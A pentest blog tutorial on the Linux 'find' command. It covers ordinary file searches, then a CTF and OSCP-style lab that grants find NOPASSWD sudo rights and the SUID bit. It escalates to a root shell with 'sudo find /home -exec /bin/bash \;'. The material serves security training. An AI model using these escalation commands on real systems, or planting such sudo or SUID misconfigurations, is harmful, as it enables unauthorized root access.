<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: Find Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-06-14T16:44:45+00:00">June 14, 2019</time><time class="updated" datetime="2025-05-10T20:32:42+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today in this article we are back with another most advantageous command from the series of Linux for Pentester i.e.<strong> “Find’</strong>. The Find command is used to search the list of files and directories, so by knowing this fact, we will now illustrate how we can avail it in Privilege Escalation.</span></p>
<p><em><strong>NOTE: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticizing any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”</strong>  </em></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><span style="color: #000000;"><strong>Introduction to Find</strong></span></p>
<ul>
<li><span style="color: #000000;">Major Operation performed using Find</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting Find</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo Rights Lab setups for Privilege Escalation</span></li>
<li><span style="color: #000000;">Exploiting Sudo rights</span></li>
<li><span style="color: #000000;">SUID Lab setups for Privilege Escalation</span></li>
<li><span style="color: #000000;">Exploiting SUID</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Introduction to Find</strong></span></h3>
<p><span style="color: #000000;"> Find command is a command line facility for a walk around a file pyramid structure to find the exact location of the file and directory as per the user’s desire. This search command can be used by the variability of services like search any file by “<strong>size, permissions, date of modifications/access, users, groups”</strong> and many more as per user requisite.</span></p>
<p><span style="color: #000000;">Alike every command the Find also can be concisely understood by its help/man command as per below image.</span></p>
<pre class="lang:default decode:true">find --help</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8jpb9Apf_j0/XQPJ7iOaIOI/AAAAAAAAeyY/jO0U6q0-z-g5iOwi_kM-O4ARzAAuy8WtQCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Major Operation performed using Find</strong></span></h3>
<p><span style="color: #000000;"><strong>Search any file by particular name in the current directory: </strong>This command supports the user to search any file by a specific name. Suppose we want to search a text file by the name of <strong>“raj”</strong> from current directory then simply compose the command as per below screenshot.</span></p>
<pre class="lang:default decode:true">find . -name raj.txt</pre>
<p><span style="color: #000000;"><strong>Search any file by particular name in the home directory</strong>: If we wish to find all the files under home directory by desired file name, in our case it is “raj.txt” then from command as below:</span></p>
<pre class="lang:default decode:true">find /home -name raj.txt</pre>
<p><span style="color: #000000;">(It will permit the user to find all “raj.txt” file under home directory)</span></p>
<p><span style="color: #000000;"><strong>Find files by its extension: </strong>This can be returned by specifying the particular file extension. If any user wants to fetch any file by its extension, then it can be done by <strong>“-type f” option </strong>followed by <strong>Find</strong> As in our scenario we are fetching for <strong>.txt</strong></span></p>
<p><span style="color: #000000;">One can also use the <strong>“-type d”</strong> option instead of the <strong>“-type f”</strong> for retrieving the directory.</span></p>
<pre class="lang:default decode:true">find / -type f -name "*.txt"</pre>
<p><span style="color: #000000;">This command will support the user for printing all .txt file as the desired output.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gBbHAg3UWNA/XQPJ8ftLz_I/AAAAAAAAeyk/dzVy25XdFRQ5k9Vy8ojTuz8Ec79XFKQPwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;"><strong>Find files with full permission: </strong>Whenever anybody wishes to explore for the files that have full permission i.e. <strong>“777” </strong>then it can be simply acquired by <strong>“-perm 0777”</strong> followed by <strong>Find</strong> command with the option <strong>“-type f” </strong>which will print the output for all the files that have“<strong>777” </strong></span></p>
<pre class="lang:default decode:true">find . -type f -perm 0777 -print</pre>
<p><span style="color: #000000;"><strong>To find all files for a specific user of a directory: </strong>If we need to find all those files that belong to a particular user under any selective directory then that we can execute this by command as:</span></p>
<pre class="lang:default decode:true">find /tmp -user raj</pre>
<p><span style="color: #000000;">In our instance, we are finding for all those files that belong to user “raj” under “tmp directory”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yfb2II72da4/XQPJ8qpNVhI/AAAAAAAAeyo/LSz2PFhETjYwwDuzEPq4lf-vEZXY8QHoQCLcBGAs/s1600/3.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong>To find all hidden files: </strong>If we want to find all hidden files within any directory then we will type the command as below:</span></li>
</ul>
<pre class="lang:default decode:true">find /tmp -type f -name ".*"</pre>
<p><span style="color: #000000;">This command will give a consequence for all hidden files in the current directory.</span></p>
<p><span style="color: #000000;"><strong>To find all readable files within a directory: </strong>To find all readable files from a specific directory. In the below screenshot we are discovering for all those files that is in the readable form under <strong>/etc</strong> directory</span></p>
<pre class="lang:default decode:true">find /etc/ -readable -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">By typing above command, we will get all readable files that come under <strong>/etc</strong> as output.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hJlLw9XaK-w/XQPJ82YezxI/AAAAAAAAeys/jB0k3pO8SrUQfmd3U3mLxA7rWiMu3jYaQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;"><strong>Find SUID files: </strong>Whenever any command runs, at which <strong>SUID</strong> bit is set then its effective <strong>UID</strong> becomes the owner of that file. So, if we want to find all those files that hold the <strong>SUID</strong> bit then it can be retrieved by typing the command:</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-exWm53IoNk8/XQPJ9SZitUI/AAAAAAAAeyw/eKyRoJK-fLMGx2qzfhmBzyQ7Zlz8j2u9QCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;"><strong>Find SGID files: </strong>The <strong>SGID</strong> permission is similar as SUID but the only difference is that, whenever any command runs at which <strong>SGID</strong> permission is set, then the process will have the same group ownership as the owner of the file. So, to run all those files that possess <strong>SGID</strong> bit, type command:</span></p>
<pre class="lang:default decode:true">find / -perm -g=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Tpl8rslKUuE/XQPJ9tCcfbI/AAAAAAAAey0/USv6jPcXrjItUQmKJkOqcgYMly_YFn_qwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>To find SUID &amp; SGID files simultaneously: </strong>If we want to fetch all those files simultaneously at which both bits i.e. <strong>“SUID &amp; SGID”</strong> are set then frame command as:</span></p>
<pre class="lang:default decode:true">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lIc7WCbQMEo/XQPJ9i0-EaI/AAAAAAAAey4/f8B6cnQJ1oAxg-IVt6HQj8CLNCp6vSDnwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;"><strong>To find all writable file:</strong> To find any writable directories within any desired directory such as: /home, /tmp, /root, then we will run the command as:</span></p>
<pre class="lang:default decode:true">find /home -writable -type d 2&gt;/dev/null</pre>
<p><span style="color: #000000;">As per below image we have find all writable directories from /home.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hd4KensjiSo/XQPJ-GDErUI/AAAAAAAAey8/RlgcvQmkh_w5Bz9_u_dokaKhzLvkN3-FACLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong><u>Exploiting Find</u></strong></span></h3>
<p><span style="color: #000000;"><strong>Sudo Rights Lab setups for Privilege Escalation</strong></span></p>
<p><span style="color: #000000;">Now we will set up our lab of <strong>Find</strong> command by granting it higher privilege i.e. with administrative rights. As we know the performance of every command gets changed after the influence of higher privileges. Same we will check for our<strong> Find</strong> command and will grasp what effect it would have after the accomplishment of sudo rights and how we can custom it more in privilege escalation.</span></p>
<p><span style="color: #000000;">To recognize it more visibly first we will create a local user (test) who retain all sudo rights as root.</span></p>
<p><span style="color: #000000;">To add sudo right open /etc/sudoers file and frame below command as user Privilege specification.</span></p>
<pre class="lang:default decode:true">test  ALL=(root) NOPASSWD: /usr/bin/find</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y2Vbwxup7AQ/XQPJ-Xm9-vI/AAAAAAAAezA/5QcsdrZD2HYk3YM4sBB7tPcbr8KiHypHQCLcBGAs/s1600/9.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting Sudo rights</strong></span></h3>
<p><span style="color: #000000;">Now we will start exploiting Find service by taking the privilege of sudoer’s permission. For this, we must have a session of the victim’s machine which will enable us to devise the local user access of the targeted system which will support us further to escalate the root user’s rights.</span></p>
<p><span style="color: #000000;"> For this we need to connect with the target machine with ssh, so type the command as shown below for performing the same.</span></p>
<pre class="lang:default decode:true">ssh test@192.168.1.108</pre>
<p><span style="color: #000000;">Then we checked for sudo right of “test” user (if given) and found that user “test” can execute Find command as “root” without a password.</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">Find command let you perform some specific action such as <strong>“print, delete and exec”</strong>. So here we are taking the privilege of <strong>“exec”</strong> for executing the command to access root shell by running /bin/bash with the help of find command as given below:</span></p>
<pre class="lang:default decode:true">sudo find /home -exec /bin/bash \;</pre>
<p><span style="color: #000000;">On running above command, we have successfully escalated the root shell as shown in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bv8GAn9WOPs/XQPJ7A8eSKI/AAAAAAAAeyQ/QSdsFjpKQ6oUWqwcDCFLB5VjQ_KfHmoAQCLcBGAs/s1600/10.png"/></span></p>
<h3><span style="color: #800000;"><strong>SUID Lab setups for Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">As we know the <strong>SUID</strong> bit permission enables the user to execute any files as the ownership of existing file member. Now we are enabling <strong>SUID</strong> permission on Find so that a local user can take the opportunity of Find as the root user.</span></p>
<p><span style="color: #000000;">Hence type following for enabling SUID bit:</span></p>
<pre class="lang:default decode:true ">which find
chmod u+s /usr/bin/find
ls -la /usr/bin/find</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-vaZNm7l7GQE/XQPJ7Sx6HCI/AAAAAAAAeyU/pxoRtytfhPUrnPZ1dC0WN6dvEL6Wlpj8gCLcBGAs/s1600/11.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Exploiting SUID</strong></span></h3>
<p><span style="color: #000000;">As we know we have access to victim’s machine so we will use<strong> Find</strong> command to identify binaries having SUID permission.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">So here we came to recognize that SUID bit is empowered for so many binary files, but our concerned is:   <strong>/usr/bin/find.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6b5bzVaYwDM/XQPJ8OLmgWI/AAAAAAAAeyc/J6wqIV-sGNo3rKrZ3SkBNllxgSLc5Sa6ACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">As we know Find command supports the user to perform some specific action such as print, delete and exec. So here again we are taking the privilege of <strong>“exec” </strong>for executing another command i.e. <strong>“whoami”</strong></span></p>
<pre class="lang:default decode:true ">find raj -exec "whoami" \;</pre>
<p><span style="color: #000000;">Similarly, you can take honour of <strong>Find</strong> command for escalating the root privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7IhAKER3irA/XQPJ8OEj0WI/AAAAAAAAeyg/92sG3-P9xMESv2x8YtWxaYnVbOCZGbKtQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
